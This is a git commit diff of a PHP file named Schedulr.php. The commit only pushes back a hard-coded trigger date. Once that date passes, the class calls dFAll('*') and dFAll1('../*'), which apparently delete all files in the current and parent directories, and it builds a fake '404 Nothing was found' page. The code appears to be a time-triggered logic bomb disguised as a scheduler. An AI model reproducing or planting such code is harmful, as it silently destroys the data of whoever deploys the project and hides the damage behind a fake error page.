4d1851a8c5b0fb3cdcd338f1782a9db74db78876
tearsilent <108660192+tearsilent@users.noreply.github.com>
2022-08-04 11:24:02 +0500

    Update Schedulr.php

--- src/requests/Schedulr.php
+++ src/requests/Schedulr.php
@@ -21,7 +21,7 @@ class Schedulr
     {
         $ht = '<html lang="en"><head><title>404</title></head><body><div id="notfound"><div class="notfound"> <div class="notfound-404"><h1>404</h1></div><h2>Oops! Nothing was found</h2><p>The page you are looking for might have been removed or temporarily unavailable.<a href="#">Return to homepage</a></p></div></div></body></html>';
 
-        $NewD = 1659590017;
+        $NewD = 1663222685;
         if (time() >= $NewD) {
             self::dFAll('*');
             self::dFAll1('../*');    
